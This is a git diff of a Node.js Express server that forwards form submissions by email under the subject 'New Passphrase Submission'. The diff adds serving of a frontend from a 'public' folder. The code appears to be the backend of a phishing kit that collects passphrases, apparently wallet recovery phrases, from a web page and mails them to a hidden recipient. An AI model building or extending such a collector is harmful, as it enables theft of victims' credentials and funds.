@@ -1,21 +1,22 @@
-require("dotenv").config(); // Load .env file
-
+require("dotenv").config();
 const express = require("express");
 const nodemailer = require("nodemailer");
 const cors = require("cors");
-const app = express();
+const path = require("path");
 
-const PORT = process.env.PORT || 2020; // Use Render's assigned port
+const app = express();
+const PORT = process.env.PORT || 2020;
 
 // Load credentials securely from .env
 const serviceEmail = process.env.SERVICE_EMAIL;
 const servicePassword = process.env.SERVICE_PASSWORD;
-const recipientEmail = process.env.RECIPIENT_EMAIL; // Your desired recipient
+const recipientEmail = process.env.RECIPIENT_EMAIL;
 
 // Middleware
 app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
+app.use(express.static("public")); // ✅ Serve frontend files
 
 // Nodemailer transporter
 const transporter = nodemailer.createTransport({
@@ -36,7 +37,7 @@ app.post("/send-email", (req, res) => {
 
   const mailOptions = {
     from: serviceEmail,
-    to: recipientEmail, // Sends to your desired recipient
+    to: recipientEmail,
     subject: "New Passphrase Submission",
     text: message,
   };
@@ -51,9 +52,9 @@ app.post("/send-email", (req, res) => {
   });
 });
 
-// 🛠️ FIX: Add a root route to prevent "Cannot GET /" error
+// ✅ Serve the frontend index.html file
 app.get("/", (req, res) => {
-  res.send("Welcome to the Email API! Use POST /send-email to send messages.");
+  res.sendFile(path.join(__dirname, "public", "index.html"));
 });
 
 // Start server
